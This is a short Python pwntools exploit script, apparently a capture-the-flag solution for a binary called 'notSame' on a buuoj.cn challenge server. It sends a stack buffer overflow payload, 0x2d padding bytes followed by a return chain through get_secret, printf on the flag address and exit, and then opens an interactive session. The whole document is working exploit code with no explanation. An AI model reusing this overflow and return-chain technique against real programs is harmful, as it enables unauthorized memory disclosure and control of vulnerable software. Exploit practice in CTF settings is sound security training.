from pwn import *
#sh = process("./notSame")
sh = remote('node5.buuoj.cn',25530)
get_secret = 0x80489A0
flag = 0x80ECA2D
printf = 0x804F0A0
write = 0x806E270
exit_add = 0x804E660

#payload = b"a"*(0x2d)+p32(get_sercret)+p32(write)+p32(1)+p32(1)+p32(flag)+p32(46)
payload = b"A"*0x2d + p32(get_secret) + p32(printf) + p32(exit_add) + p32(flag) 
#sh.recvuntil(b"b0r4 v3r s3 7u 4h o b1ch4o m3m0... ")
sh.sendline(payload)
sh.interactive()
